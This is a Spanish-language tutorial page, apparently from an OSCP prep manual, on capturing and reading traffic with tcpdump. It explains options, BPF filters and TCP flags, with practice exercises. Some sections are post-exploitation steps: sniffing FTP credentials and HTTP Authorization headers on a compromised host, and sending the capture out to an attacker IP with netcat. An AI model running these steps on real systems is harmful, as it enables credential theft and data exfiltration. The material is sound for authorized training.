---
title: "tcpdump a Fondo"
order: 13
description: "Aprende a capturar y analizar tráfico de red con tcpdump desde la línea de comandos, esencial cuando no tienes GUI en la máquina comprometida durante el OSCP."
---

## Por Qué Importa tcpdump en el OSCP

Cuando consigues una shell en una máquina víctima Linux, lo más probable es que no tengas entorno gráfico. No puedes abrir Wireshark. Sin embargo, el tráfico que circula por esa máquina puede contener credenciales, comunicaciones internas o pistas sobre la infraestructura de la red. `tcpdump` es tu sniffer en esas condiciones.

Su otro uso clave es en **pivoting**: capturas el tráfico en el host comprometido con `tcpdump -w archivo.pcap`, transfieres el fichero a tu máquina de ataque y lo analizas cómodamente con Wireshark (ver [Wireshark a Fondo](/cybersec/manual/redes/wireshark-a-fondo)).

> [!IMPORTANT]
> `tcpdump` requiere privilegios de root o la capability `CAP_NET_RAW` para capturar en modo promiscuo. Si ya eres root en la máquina comprometida, puedes capturar todo el tráfico que pasa por sus interfaces.

---

## Opciones Base

### Selección de interfaz

```bash
tcpdump -i eth0           # Capturar en la interfaz eth0
tcpdump -i any            # Capturar en TODAS las interfaces simultáneamente
tcpdump -D                # Listar interfaces disponibles (útil si no conoces el nombre)
```

Usa `-i any` cuando no sabes por qué interfaz circula el tráfico que buscas, por ejemplo en hosts con múltiples interfaces de red (un pivot entre segmentos).

### Resolución de nombres

```bash
tcpdump -n                # No resolver IPs a nombres de host (más rápido, menos ruido DNS)
tcpdump -nn               # No resolver IPs NI puertos a nombres de servicio
```

> [!TIP]
> Usa siempre `-nn` en entornos ofensivos. La resolución DNS genera consultas adicionales que pueden alertar sistemas de detección, y además hace más lenta la captura.

### Verbosidad y cantidad de paquetes

```bash
tcpdump -v                # Más detalles (TTL, longitud, opciones IP)
tcpdump -vv               # Aún más detalles (opciones TCP, etc.)
tcpdump -c 100            # Capturar solo 100 paquetes y salir automáticamente
```

### Escritura y lectura de ficheros

```bash
tcpdump -w captura.pcap   # Guardar paquetes en formato pcap (para Wireshark)
tcpdump -r captura.pcap   # Leer y analizar un pcap existente
```

> [!NOTE]
> Al usar `-w`, tcpdump **no muestra los paquetes en pantalla**. Para ver el progreso, añade `-v` o envía SIGINFO (`Ctrl+T` en algunos sistemas) para obtener estadísticas.

### Visualización del payload

```bash
tcpdump -A                # Muestra el payload en ASCII (ideal para protocolos en claro)
tcpdump -X                # Muestra el payload en hexadecimal + ASCII (estilo xxd)
tcpdump -s 0              # Captura el paquete COMPLETO (por defecto puede truncar)
```

> [!IMPORTANT]
> El flag `-s 0` (snaplen = 0, es decir, ilimitado) es **crítico**. Sin él, las versiones antiguas de tcpdump truncan los paquetes a 68 o 96 bytes, perdiendo el payload. Acostúmbrate a incluirlo siempre que necesites ver el contenido.

### Tabla resumen de opciones

| Opción | Función | Cuándo usarla |
|---|---|---|
| `-i <iface>` / `-i any` | Selecciona interfaz | Siempre |
| `-nn` | Sin resolución DNS/puertos | Siempre en ofensivo |
| `-s 0` | Captura paquete completo | Cuando necesitas el payload |
| `-w archivo.pcap` | Guarda en disco | Para analizar después en Wireshark |
| `-r archivo.pcap` | Lee un pcap | Para analizar offline |
| `-A` | Payload en ASCII | Protocolos en claro (HTTP, FTP) |
| `-X` | Payload hex+ASCII | Análisis binario, protocolos desconocidos |
| `-c N` | Limita a N paquetes | Capturas breves o pruebas |
| `-v` / `-vv` | Más detalle | Diagnóstico de cabeceras |

---

## Filtros BPF

Los filtros BPF (Berkeley Packet Filter) son el corazón de tcpdump. Se especifican al final del comando, entre comillas simples si contienen caracteres especiales o espacios.

> [!NOTE]
> Estos **son los mismos filtros** que usa Wireshark en el modo "Capture Filter". La sintaxis BPF es estándar y se comparte entre tcpdump, Wireshark y libpcap.

### Filtros básicos

```bash
# Por host (origen O destino)
tcpdump host 10.10.10.5

# Solo desde un origen
tcpdump src 10.10.10.5

# Solo hacia un destino
tcpdump dst 10.10.10.5

# Por subred
tcpdump net 172.16.0.0/24

# Por puerto (TCP o UDP)
tcpdump port 80

# Puerto de origen
tcpdump src port 443

# Por protocolo
tcpdump tcp
tcpdump udp
tcpdump icmp
```

### Combinación con operadores lógicos

```bash
# HTTP hacia/desde un host concreto
tcpdump 'host 10.10.10.5 and port 80'

# Todo excepto SSH (para no capturar tu propia sesión)
tcpdump 'not port 22'

# FTP o Telnet (protocolos en claro)
tcpdump 'port 21 or port 23'

# Subred y protocolo específico
tcpdump 'net 192.168.1.0/24 and tcp'
```

> [!TIP]
> Cuando capturas desde tu propia sesión SSH, excluye el puerto 22 con `not port 22`. De lo contrario, verás tu propio tráfico SSH mezclado con lo que te interesa, lo que satura la salida.

### Filtro avanzado: solo paquetes SYN

```bash
tcpdump 'tcp[13] & 2 != 0'
```

**Por qué funciona:** `tcp[13]` accede al byte 13 del encabezado TCP (el byte de flags). La máscara `& 2` aisla el bit SYN (bit 1, valor decimal 2). Si el resultado `!= 0`, el bit SYN está activo. Este filtro captura SYN y SYN/ACK; para solo SYN iniciales: `'tcp[13] == 2'`.

```text
Byte 13 del encabezado TCP (flags):
┌───┬───┬───┬───┬───┬───┬───┬───┐
│CWR│ECE│URG│ACK│PSH│RST│SYN│FIN│
└───┴───┴───┴───┴───┴───┴───┴───┘
  7   6   5   4   3   2   1   0   ← bit
 128  64  32  16   8   4   2   1  ← valor decimal
```

---

## Interpretar la Salida de tcpdump

La salida estándar de tcpdump tiene este formato:

```text
HH:MM:SS.microsegundos IP src.puerto > dst.puerto: flags [X], seq N, ack N, win N, len N
```

### Notación de flags TCP

| Notación | Flags activos | Significado |
|---|---|---|
| `[S]` | SYN | Inicio de conexión (cliente → servidor) |
| `[S.]` | SYN + ACK | Respuesta del servidor (puerto abierto) |
| `[.]` | ACK | Confirmación sin datos |
| `[P.]` | PSH + ACK | Datos enviados (el emisor pide al receptor que procese ya) |
| `[F.]` | FIN + ACK | Cierre de conexión (orderly shutdown) |
| `[R]` | RST | Reset (cierre abrupto, puerto cerrado, error) |
| `[R.]` | RST + ACK | Reset con confirmación |

> [!NOTE]
> El punto `.` en la notación indica que el bit ACK está activo. Casi todos los paquetes tras el handshake inicial llevan ACK. Por eso `[P.]` significa PSH+ACK (lo habitual para datos), no solo PSH.

Para más detalle sobre el funcionamiento del handshake TCP y el significado de cada flag en el protocolo, consulta [TCP a Fondo](/cybersec/manual/redes/tcp-a-fondo).

### Ejemplo de salida: conexión HTTP completa

```text
10:23:01.001 IP 10.10.14.2.54321 > 10.10.10.5.80: Flags [S], seq 1234, win 64240, len 0
10:23:01.002 IP 10.10.10.5.80 > 10.10.14.2.54321: Flags [S.], seq 5678, ack 1235, win 65535, len 0
10:23:01.002 IP 10.10.14.2.54321 > 10.10.10.5.80: Flags [.], ack 5679, win 64240, len 0
10:23:01.003 IP 10.10.14.2.54321 > 10.10.10.5.80: Flags [P.], seq 1235:1380, ack 5679, len 145
10:23:01.010 IP 10.10.10.5.80 > 10.10.14.2.54321: Flags [P.], seq 5679:7200, ack 1380, len 1521
10:23:01.011 IP 10.10.14.2.54321 > 10.10.10.5.80: Flags [F.], seq 1380, ack 7201, len 0
```

Lectura línea a línea:
1. `[S]` — el cliente inicia la conexión.
2. `[S.]` — el servidor acepta: **puerto 80 está abierto**.
3. `[.]` — el cliente confirma el handshake.
4. `[P.]` — el cliente envía la petición HTTP (145 bytes).
5. `[P.]` — el servidor responde con datos (1521 bytes).
6. `[F.]` — el cliente cierra la conexión.

---

## Flujo Típico OSCP: Capturar en Pivote y Analizar en Local

Este es el flujo que más usarás cuando tengas acceso a una máquina interna:

```text
[Tu máquina Kali]          [Máquina comprometida / pivote]
        │                           │
        │  1. Shell SSH/meterpreter │
        │◄──────────────────────────│
        │                           │
        │  2. Ejecutas tcpdump      │
        │      -i any -nn -s 0      │
        │      -w /tmp/cap.pcap     │
        │◄──────────────────────────│
        │                           │
        │  3. Esperas tráfico...    │
        │       (Ctrl+C para parar) │
        │                           │
        │  4. Transferir pcap       │
        │  scp/wget/nc              │
        │◄──────────────────────────│
        │                           │
        │  5. Abrir en Wireshark    │
        │  wireshark cap.pcap       │
        │                           │
```

### Paso 1: Capturar en la máquina comprometida

```bash
# Como root en la máquina pivote:
tcpdump -i any -nn -s 0 -w /tmp/captura.pcap 'not port 22'
# Ctrl+C para detener la captura cuando tengas suficiente tráfico
```

### Paso 2: Transferir el fichero

```bash
# Desde tu Kali, copiar el pcap via SCP (si tienes credenciales SSH):
scp usuario@10.10.10.5:/tmp/captura.pcap ./captura.pcap

# Alternativa con netcat si no hay SSH:
# En Kali (receptor):
nc -lvnp 4444 > captura.pcap
# En la víctima (emisor):
nc 10.10.14.2 4444 < /tmp/captura.pcap
```

### Paso 3: Analizar en Wireshark

```bash
wireshark captura.pcap
```

A partir de aquí aplica los filtros de display, Follow Stream y Export Objects descritos en [Wireshark a Fondo](/cybersec/manual/redes/wireshark-a-fondo).

### Vista rápida en CLI sin transferir

Si necesitas una respuesta inmediata sin mover el fichero:

```bash
# Ver credenciales FTP en tiempo real en la víctima:
tcpdump -i any -nn -s 0 -A 'port 21'

# Ver peticiones HTTP (método y URL) en tiempo real:
tcpdump -i any -nn -s 0 -A 'port 80' | grep -E 'GET|POST|Host:|Authorization:'
```

> [!WARNING]
> El uso de `-A` en tiempo real puede generar mucho output en redes con alto tráfico. Limita con `-c N` o filtros BPF precisos para no saturar la terminal ni el log de la shell.

---

## Práctica

**Ejercicio 1.** Escribe el comando `tcpdump` para capturar **solo tráfico HTTP** (puerto 80) en cualquier dirección **hacia o desde la IP 10.10.10.5**, captando el paquete completo y guardando el resultado en `/tmp/http_victim.pcap`. Excluye la resolución de nombres.

<details>
<summary>Ver solución</summary>

```bash
tcpdump -i any -nn -s 0 -w /tmp/http_victim.pcap 'host 10.10.10.5 and port 80'
```

**Desglose:**
- `-i any` — captura en todas las interfaces (útil si no sabemos por cuál llega el tráfico).
- `-nn` — sin resolución de DNS ni de nombres de puertos.
- `-s 0` — snaplen ilimitado; captura el paquete completo incluyendo el payload HTTP.
- `-w /tmp/http_victim.pcap` — guarda en pcap para análisis posterior con Wireshark.
- `'host 10.10.10.5 and port 80'` — filtro BPF: solo paquetes que involucren esa IP y el puerto 80.

</details>

**Ejercicio 2.** En una captura ves la siguiente línea en la salida de tcpdump:

```text
10:45:12.003 IP 10.10.10.5.80 > 10.10.14.2.54678: Flags [S.], seq 987654, ack 123457, win 65535, len 0
```

¿Qué significa `[S.]` y qué conclusión puedes sacar sobre el puerto 80 en 10.10.10.5?

<details>
<summary>Ver solución</summary>

`[S.]` indica que el paquete tiene activos los bits **SYN** y **ACK** simultáneamente, es decir, es un **SYN/ACK**.

En el handshake TCP de tres vías:
1. El cliente envía SYN (`[S]`) — solicita abrir conexión.
2. El servidor responde con SYN/ACK (`[S.]`) — **acepta la conexión**.
3. El cliente confirma con ACK (`[.]`).

La conclusión es que el **puerto 80/TCP en 10.10.10.5 está abierto y en escucha**. El servidor ha aceptado la solicitud de conexión del cliente en `10.10.14.2`. Si el puerto estuviera cerrado, el servidor respondería con un RST (`[R]`) en lugar de un SYN/ACK.

Este comportamiento es la base del escaneo TCP SYN (half-open scan) de Nmap, explicado en detalle en [TCP a Fondo](/cybersec/manual/redes/tcp-a-fondo).

</details>

---

## Recursos

- [tcpdump — Sitio oficial](https://www.tcpdump.org)
- [Manpage de tcpdump (Ubuntu Noble)](https://manpages.ubuntu.com/manpages/noble/en/man1/tcpdump.1.html)
- [Póster SANS TCP/IP and tcpdump](https://www.sans.org/posters/tcp-ip-and-tcpdump/)
- [Wireshark — Análisis visual de capturas pcap](https://www.wireshark.org)
